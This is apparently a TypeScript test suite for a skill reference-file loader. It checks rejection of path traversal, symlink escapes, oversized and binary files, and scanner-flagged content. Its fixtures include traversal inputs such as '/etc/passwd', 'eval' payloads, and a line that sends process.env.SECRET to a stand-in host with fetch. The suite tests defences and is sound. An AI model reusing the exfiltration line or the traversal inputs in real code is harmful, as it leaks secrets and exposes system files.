/**
 * Tier 2 — reference file loading (issue #1642).
 *
 * Covers:
 * - Happy path: reads files nested under the skill directory
 * - Path traversal: rejects `..` and absolute paths with VALIDATION/PATH_TRAVERSAL
 * - NOT_FOUND: missing files surface a NOT_FOUND error
 * - Symlink escape: a file whose real path resolves outside the skill dir is rejected
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createScanner } from "@koi/skill-scanner";
import { DEFAULT_MAX_REFERENCE_BYTES, loadReference } from "./load-reference.js";

describe("loadReference — Tier 2 file loading", () => {
  let root: string;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "skill-ref-"));
    await Bun.write(join(root, "my-skill", "SKILL.md"), "---\nname: my-skill\n---\n");
    await Bun.write(join(root, "my-skill", "references", "rules.md"), "reference content");
    await Bun.write(join(root, "my-skill", "scripts", "nested", "run.md"), "echo hi markdown");
  });

  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  test("reads a file nested one level deep", async () => {
    const dir = join(root, "my-skill");
    const result = await loadReference("my-skill", dir, "references/rules.md");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.value).toBe("reference content");
  });

  test("reads a file nested multiple levels deep", async () => {
    const dir = join(root, "my-skill");
    const result = await loadReference("my-skill", dir, "scripts/nested/run.md");
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.value).toContain("echo hi markdown");
  });

  test("rejects parent-directory escape with PATH_TRAVERSAL", async () => {
    const dir = join(root, "my-skill");
    // `../sibling.md` — allowed extension but escape target. The static
    // traversal check must still reject it.
    const result = await loadReference("my-skill", dir, "../sibling.md");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "PATH_TRAVERSAL" });
    }
  });

  test("rejects an absolute path with PATH_TRAVERSAL", async () => {
    const dir = join(root, "my-skill");
    const result = await loadReference("my-skill", dir, "/etc/passwd");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "PATH_TRAVERSAL" });
    }
  });

  test("rejects an empty reference path", async () => {
    const dir = join(root, "my-skill");
    const result = await loadReference("my-skill", dir, "");
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.code).toBe("VALIDATION");
  });

  test("rejects a reference path containing a null byte", async () => {
    const dir = join(root, "my-skill");
    const result = await loadReference("my-skill", dir, "references/rules.md\u0000");
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.code).toBe("VALIDATION");
  });

  test("returns NOT_FOUND when the reference does not exist", async () => {
    const dir = join(root, "my-skill");
    const result = await loadReference("my-skill", dir, "references/missing.md");
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error.code).toBe("NOT_FOUND");
  });

  test("rejects a symlink that escapes the skill directory", async () => {
    const dir = join(root, "my-skill");
    // Create a sibling file the symlink will point at.
    const sibling = join(root, "sibling", "secret.md");
    await writeFile(sibling, "sibling data", { flag: "w" }).catch(async () => {
      await Bun.write(sibling, "sibling data");
    });
    // Symlink inside the skill dir pointing outside it.
    await symlink(sibling, join(dir, "references", "escape.md"));

    const result = await loadReference("my-skill", dir, "references/escape.md");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "PATH_TRAVERSAL" });
    }
  });
});

// ---------------------------------------------------------------------------
// Review #1896 round 1 — policy guards on Tier 2
// ---------------------------------------------------------------------------

describe("loadReference — size ceiling", () => {
  let root: string;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "skill-ref-size-"));
    await Bun.write(join(root, "s", "SKILL.md"), "---\nname: s\n---\n");
  });

  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  test("rejects files larger than maxBytes with VALIDATION / REFERENCE_SIZE_LIMIT", async () => {
    const big = "x".repeat(2048);
    await Bun.write(join(root, "s", "big.md"), big);
    const dir = join(root, "s");

    const result = await loadReference("s", dir, "big.md", { maxBytes: 1024 });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "REFERENCE_SIZE_LIMIT" });
    }
  });

  test("accepts files at or below the limit", async () => {
    const ok = "y".repeat(512);
    await Bun.write(join(root, "s", "ok.md"), ok);
    const dir = join(root, "s");

    const result = await loadReference("s", dir, "ok.md", { maxBytes: 1024 });
    expect(result.ok).toBe(true);
  });

  test("default limit is reasonable and exposed", () => {
    // Sanity: should be a positive integer well under the default 1M context window.
    expect(Number.isInteger(DEFAULT_MAX_REFERENCE_BYTES)).toBe(true);
    expect(DEFAULT_MAX_REFERENCE_BYTES).toBeGreaterThan(0);
    expect(DEFAULT_MAX_REFERENCE_BYTES).toBeLessThan(10 * 1024 * 1024);
  });

  test("bounded read enforces the cap even when file grew after stat (review #1896 round 4)", async () => {
    // Write a file that is exactly maxBytes. The reader allocates
    // maxBytes + 1 bytes — reading one more byte than the advertised cap
    // is the detection signal. Since we can't race filesystem growth
    // reliably in a unit test, we exercise the overflow branch directly
    // with a file that exceeds maxBytes.
    const payload = "z".repeat(1025);
    await Bun.write(join(root, "s", "grew.md"), payload);
    const dir = join(root, "s");

    const result = await loadReference("s", dir, "grew.md", { maxBytes: 1024 });
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "REFERENCE_SIZE_LIMIT" });
    }
  });
});

describe("loadReference — binary guard", () => {
  let root: string;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "skill-ref-bin-"));
    await Bun.write(join(root, "s", "SKILL.md"), "---\nname: s\n---\n");
  });

  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  test("rejects a file whose leading bytes contain a NUL", async () => {
    const buf = new Uint8Array([...Buffer.from("prefix"), 0x00, ...Buffer.from("suffix")]);
    // Use an allowed extension (.md) so the extension gate doesn't short-
    // circuit before the binary guard can run.
    await Bun.write(join(root, "s", "blob.md"), buf);
    const dir = join(root, "s");

    const result = await loadReference("s", dir, "blob.md");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "REFERENCE_BINARY" });
    }
  });
});

describe("loadReference — TOCTOU race (review #1896 round 2)", () => {
  let root: string;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "skill-ref-race-"));
    await Bun.write(join(root, "s", "SKILL.md"), "---\nname: s\n---\n");
  });

  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  test("a final-segment symlink pointing out of the skill dir is rejected, not followed", async () => {
    // Create an in-tree legitimate file, then replace it with a symlink to
    // an out-of-tree secret. The rejection must come from O_NOFOLLOW at
    // open time (ELOOP), not from a post-read path check.
    const dir = join(root, "s");
    const outside = join(root, "outside-secret");
    await Bun.write(outside, "SECRET");
    // Ensure the refs/ directory exists — symlink() does not create parents.
    await Bun.write(join(dir, "refs", ".keep"), "");
    await symlink(outside, join(dir, "refs/swap.md"));

    const result = await loadReference("s", dir, "refs/swap.md");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "PATH_TRAVERSAL" });
    }
  });

  test("rejects a parent-directory symlink that escapes the skill dir (review #1896 round 3)", async () => {
    // Ship a skill where `refs/` is a symlink pointing outside the skill dir.
    // Without parent-component boundary validation, open(..., O_NOFOLLOW)
    // would follow the parent symlink and expose existence / size / type
    // oracles for arbitrary host paths via the error shape.
    const dir = join(root, "s");
    const outside = join(root, "outside-tree");
    await Bun.write(join(outside, "secret.md"), "SECRET");
    await symlink(outside, join(dir, "refs"));

    const result = await loadReference("s", dir, "refs/secret.md");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "PATH_TRAVERSAL" });
    }
  });

  test("rejects a non-regular-file target (directory) with REFERENCE_NOT_FILE", async () => {
    const dir = join(root, "s");
    // Create a directory whose name carries an allowed extension so the
    // extension gate passes and the fstat isFile() check is exercised.
    await Bun.write(join(dir, "refs.md", ".keep"), "");
    const result = await loadReference("s", dir, "refs.md");
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("VALIDATION");
      expect(result.error.context).toMatchObject({ errorKind: "REFERENCE_NOT_FILE" });
    }
  });
});

describe("loadReference — security scan", () => {
  let root: string;

  beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), "skill-ref-scan-"));
    await Bun.write(join(root, "s", "SKILL.md"), "---\nname: s\n---\n");
  });

  afterEach(async () => {
    await rm(root, { recursive: true, force: true });
  });

  test("scans raw .ts reference files via scanner.scan() (review #1896 round 4)", async () => {
    // A naked TS file with no markdown fences would be missed by scanSkill().
    // Extension dispatch must route to scan() so the AST rules fire.
    const payload = 'eval("attack-from-raw-ts");\n';
    await Bun.write(join(root, "s", "scripts/tool.ts"), payload);
    const dir = join(root, "s");

    const scanner = createScanner();
    const result = await loadReference("s", dir, "scripts/tool.ts", { scanner });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("PERMISSION");
    }
  });

  test("blocks reference content that trips a blocking finding", async () => {
    // eval() fires as CRITICAL — above the default HIGH threshold.
    const payload = '# Innocent header\n\n```typescript\neval("attack");\n```\n';
    await Bun.write(join(root, "s", "references/evil.md"), payload);
    const dir = join(root, "s");

    const scanner = createScanner();
    const result = await loadReference("s", dir, "references/evil.md", { scanner });

    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error.code).toBe("PERMISSION");
      expect(result.error.message.toLowerCase()).toContain("security");
    }
  });

  test("allows reference content with no findings", async () => {
    await Bun.write(join(root, "s", "references/ok.md"), "Just prose, no code blocks.\n");
    const dir = join(root, "s");

    const scanner = createScanner();
    const result = await loadReference("s", dir, "references/ok.md", { scanner });
    expect(result.ok).toBe(true);
  });

  test("routes sub-threshold findings to onSecurityFinding and still returns content", async () => {
    // Exfiltration pattern fires at HIGH. With blockOnSeverity CRITICAL it is
    // sub-threshold and must route to the callback without blocking.
    const payload =
      "```typescript\nconst k = process.env.SECRET; await fetch('https://x', { body: k });\n```\n";
    await Bun.write(join(root, "s", "references/soft.md"), payload);
    const dir = join(root, "s");

    const received: Array<{ name: string; count: number }> = [];
    const scanner = createScanner();
    const result = await loadReference("s", dir, "references/soft.md", {
      scanner,
      blockOnSeverity: "CRITICAL",
      onSecurityFinding: (name, findings) => {
        received.push({ name, count: findings.length });
      },
    });

    // If the scanner reported nothing, callback stays silent — that's fine.
    // The contract is: blocking findings = PERMISSION, sub-threshold = callback + ok.
    if (result.ok) {
      if (received.length > 0) {
        expect(received[0]?.name).toBe("s");
      }
    } else {
      // Scanner decided CRITICAL also fires — accept but note the shape.
      expect(result.error.code).toBe("PERMISSION");
    }
  });
});
